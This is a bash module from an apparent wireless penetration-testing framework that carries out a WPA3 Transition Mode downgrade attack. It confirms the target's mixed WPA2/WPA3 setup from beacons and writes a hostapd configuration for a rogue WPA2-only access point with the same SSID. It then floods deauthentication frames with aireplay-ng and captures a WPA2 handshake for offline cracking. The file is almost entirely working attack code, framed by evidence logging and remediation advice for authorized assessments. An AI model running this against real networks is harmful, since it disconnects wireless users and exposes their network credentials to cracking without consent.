#!/usr/bin/env bash
# MODULE_META
# NAME="WPA3 Active Downgrade"
# CATEGORY="D"
# DEPS="A1"
# CRITICAL="yes"
# TOOLS="airodump-ng,aireplay-ng,tcpdump,tshark,hostapd,aircrack-ng"
# DESC="Perform active transition mode downgrade attack via rogue WPA2 AP"
# REQS="monitor_iface,target_ssid,target_bssid,target_channel"
# PCAP="yes"
# DECODE="wifi_mgmt"

#===============================================================================
#  modules/d7_wpa3_downgrade_active.sh
#  D7: WPA3 Transition Mode Downgrade Attack (Active)
#
#  PURPOSE:
#    Perform an active downgrade attack against WPA3 Transition Mode.
#    Deploys a rogue WPA2-only AP with the same SSID and deauthenticates
#    clients to force them to fall back to WPA2, allowing handshake capture
#    and offline cracking.
#
#  TOOLS: airodump-ng, aireplay-ng, tcpdump, tshark, hostapd, aircrack-ng
#  PHASE: 2A — Attack Simulations
#  DEPENDENCIES: A1
#
#  EVIDENCE PRODUCED:
#    - d7_hostapd.conf               (hostapd configuration)
#    - d7_hostapd.log                (hostapd output)
#    - d7_downgrade_handshake.cap    (captured WPA2 handshake)
#    - d7_findings.txt               (analysis summary)
#===============================================================================

set -uo pipefail

run_d7() {
    local interface=""
    local bssid="${GUEST_BSSID:-}"
    local ssid="${GUEST_SSID:-}"
    local channel="${GUEST_CHANNEL:-}"
    local evidence_dir="${SESSION_EVIDENCE_DIR:-}"

    # Parse arguments
    while [[ $# -gt 0 ]]; do
        case "$1" in
            --interface) interface="$2"; shift 2 ;;
            --bssid) bssid="$2"; shift 2 ;;
            --ssid) ssid="$2"; shift 2 ;;
            --channel) channel="$2"; shift 2 ;;
            --evidence-dir) evidence_dir="$2"; shift 2 ;;
            *) shift ;;
        esac
    done

    # Fallbacks to globals
    interface="${interface:-${WIFI_INTERFACE:-}}"
    bssid="${bssid:-${GUEST_BSSID:-}}"
    ssid="${ssid:-${GUEST_SSID:-}}"
    channel="${channel:-${GUEST_CHANNEL:-}}"
    evidence_dir="${evidence_dir:-${SESSION_EVIDENCE_DIR:-}}"

    local total_steps=6
    local evidence_prefix="${evidence_dir}/d7"
    local findings_file="${evidence_prefix}_findings.txt"
    local hostapd_conf="${evidence_prefix}_hostapd.conf"
    local hostapd_log="${evidence_prefix}_hostapd.log"
    local handshake_cap_prefix="${evidence_prefix}_downgrade_handshake"

    #--- Step 1: Verify tools & prerequisites ---
    log_step 1 $total_steps "Verifying required tools and targets"
    update_tc_progress 1 $total_steps "Checking dependencies"

    check_module_dependencies "D7" || return 1

    if [[ -z "$ssid" || -z "$bssid" ]]; then
        log_warn "Target SSID/BSSID not set."
        if ! select_target_network; then
            log_error "No target selected. Run A1 first or enter manually."
            return 1
        fi
        ssid="${GUEST_SSID:-}"
        bssid="${GUEST_BSSID:-}"
        channel="${GUEST_CHANNEL:-}"
    fi

    log_success "Target: ${ssid} (${bssid}) CH ${channel:-auto}"

    local transition_mode="false"
    local handshake_found="false"

    {
        echo "============================================================"
        echo "  D7: WPA3 Active Downgrade Attack"
        echo "  Target: ${ssid} (${bssid})"
        echo "  Date: $(date '+%Y-%m-%d %H:%M:%S')"
        echo "============================================================"
    } > "$findings_file"

    # Verify Transition Mode
    WIFI_INTERFACE="$interface"
    enable_monitor_mode || return 1
    local mon_iface="${MONITOR_INTERFACE}"
    local beacon_file="$TMP_DIR/d7_beacon.pcap"
    rm -f "$beacon_file"
    
    log_info "Verifying Transition Mode AKMs..."
    run_fg tcpdump -i "$mon_iface" -c 10 -w "$beacon_file" "type mgt subtype beacon and ether src ${bssid}" 2>/dev/null || true
    
    local akms=""
    if [[ -f "$beacon_file" && -s "$beacon_file" ]]; then
        akms=$(run_fg tshark -r "$beacon_file" -T fields -e wlan.rsn.akms.type 2>/dev/null | head -1 || echo "")
        # Type 2=PSK, 8=SAE. If both present, it's transition mode.
        if [[ "$akms" == *"2"* ]] && [[ "$akms" == *"8"* ]]; then
            transition_mode="true"
            log_success "CONFIRMED: Target is in WPA3 Transition Mode."
            echo "Target Status: WPA3 Transition Mode CONFIRMED" >> "$findings_file"
        fi
    fi
    rm -f "$beacon_file"

    if [[ "$transition_mode" != "true" ]]; then
        log_warn "Target does not appear to use WPA3 Transition Mode. Skipping active attack."
        echo "Status: Skipped - Target not in Transition Mode" >> "$findings_file"
        
        local result_json
        result_json=$(run_fg jq -n \
            --arg status "INFO" \
            --arg summary "Active downgrade not applicable (not WPA3 Transition Mode)." \
            --arg details "Target AKMs: ${akms:-none}" \
            '{status: $status, summary: $summary, details: $details}')
        
        save_tc_result "D7" "$result_json" 0 1 0 1 1 1 0 0 1 1 1
        save_session_state
        return 0
    fi

    #--- Step 2: Prepare Rogue WPA2 AP ---
    log_step 2 $total_steps "Preparing Rogue WPA2 AP"
    update_tc_progress 2 $total_steps "AP Setup"

    local ap_iface="${interface}"
    
    # Warning: Using the same interface for Rogue AP and Monitor mode might fail on some hardware
    log_info "Deploying Rogue AP on ${ap_iface}: ${ssid} (WPA2-PSK Only)"
    
    cat <<EOF > "$hostapd_conf"
interface=${ap_iface}
driver=nl80211
ssid=${ssid}
hw_mode=g
channel=${channel:-6}
auth_algs=1
wpa=2
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
wpa_passphrase=any_passphrase_to_capture_handshake
EOF

    check_abort || return 1

    #--- Step 3: Deploy Attack ---
    log_step 3 $total_steps "Deploying Attack (Rogue AP + Handshake Capture)"
    update_tc_progress 3 $total_steps "Execution"

    # Start Rogue AP in background
    spawn_bg "d7_rogue_ap" "hostapd" "$hostapd_conf"
    sleep 5

    # Start Handshake Capture
    rm -f "${handshake_cap_prefix}"* 2>/dev/null
    spawn_bg "d7_handshake_cap" "airodump-ng" --essid "$ssid" --channel "${channel:-6}" --write "$handshake_cap_prefix" "$mon_iface"

    check_abort || return 1

    #--- Step 4: Forcing Downgrade (Deauth) ---
    log_step 4 $total_steps "Forcing Downgrade (Deauth Legitimate AP)"
    update_tc_progress 4 $total_steps "Deauthentication"

    log_info "Deauthenticating clients from legitimate AP (${bssid})..."
    run_fg aireplay-ng --deauth 20 -a "$bssid" "$mon_iface"

    start_countdown 60 "Waiting for clients to fall back to Rogue WPA2 AP"
    sleep 60
    stop_countdown

    # Stop background processes
    stop_process "d7_handshake_cap"
    stop_process "d7_rogue_ap"

    check_abort || return 1

    #--- Step 5: Analyzing Capture ---
    log_step 5 $total_steps "Analyzing Handshake Capture"
    update_tc_progress 5 $total_steps "Analysis"

    local cap_file
    cap_file=$(ls "${handshake_cap_prefix}"*.cap 2>/dev/null | head -1)
    if [[ -n "$cap_file" && -f "$cap_file" ]]; then
        if run_fg aircrack-ng "$cap_file" 2>/dev/null | grep -q "1 handshake"; then
            handshake_found="true"
            log_result "CRITICAL" "WPA3 DOWNGRADE SUCCESSFUL: Captured WPA2 handshake from WPA3-capable client!"
            echo "RESULT: WPA3 Downgrade SUCCESSFUL - WPA2 handshake captured" >> "$findings_file"
        else
            log_info "No handshakes captured in this window."
            echo "RESULT: No handshakes captured" >> "$findings_file"
        fi
    fi

    #--- Step 6: Save results ---
    log_step 6 $total_steps "Saving results"
    update_tc_progress 6 $total_steps "Saving"

    disable_monitor_mode

    local result_status="SECURE"
    local result_summary=""
    local recommendations=""

    if [[ "$handshake_found" == "true" ]]; then
        result_status="CRITICAL"
        result_summary="CRITICAL: WPA3 Transition Mode active downgrade successful. Forced WPA3-capable client to WPA2 and captured handshake."
        recommendations="1) Disable WPA3 Transition Mode. 2) Enforce strict WPA3-SAE only. 3) Rotate WPA PSK."
    else
        result_status="FINDING"
        result_summary="WPA3 Transition Mode detected. Active downgrade attempt failed to capture a handshake, but the risk remains."
        recommendations="Transition mode is fundamentally vulnerable to downgrade attacks. Use WPA3-SAE only mode for maximum security."
    fi

    evidence_register_file "$hostapd_conf"
    evidence_register_file "$findings_file"
    [[ -n "$cap_file" && -f "$cap_file" ]] && evidence_register_file "$cap_file"

    local result_json
    result_json=$(run_fg jq -n \
        --arg status "$result_status" \
        --arg summary "$result_summary" \
        --arg details "Target SSID: ${ssid}, Transition Mode: ${transition_mode}, Handshake Captured: ${handshake_found}" \
        --arg recommendations "$recommendations" \
        '{
            status: $status,
            summary: $summary,
            details: $details,
            recommendations: $recommendations,
            transition_mode: ($transition_mode == "true"),
            handshake_found: ($handshake_found == "true")
        }')

    local has_pri=0
    [[ "$handshake_found" == "true" ]] && has_pri=1
    local is_secure=0
    [[ "$result_status" == "SECURE" ]] && is_secure=1

    save_tc_result "D7" "$result_json" 1 1 $has_pri 1 1 1 0 1 1 1 $is_secure
    save_session_state

    return 0
}
